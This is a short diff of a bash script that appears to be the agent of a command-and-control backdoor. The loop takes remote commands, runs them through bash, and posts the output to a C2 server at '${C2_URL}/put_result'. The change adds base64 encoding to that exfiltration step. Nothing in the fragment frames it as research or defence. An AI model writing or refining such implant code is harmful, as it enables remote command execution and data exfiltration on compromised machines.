@@ -11,7 +11,7 @@ do
     CMD=$(echo $CMD | cut -d, -f 3-)
     if [ ! "$FG" = "false" ]
     then
-      echo "$CMD" | bash | curl -s -d @- "${C2_URL}/put_result?id=$ID"
+      echo "$CMD" | bash | base64 | curl -s -d @- "${C2_URL}/put_result?id=$ID"
     else
       echo "$CMD" | bash &
     fi
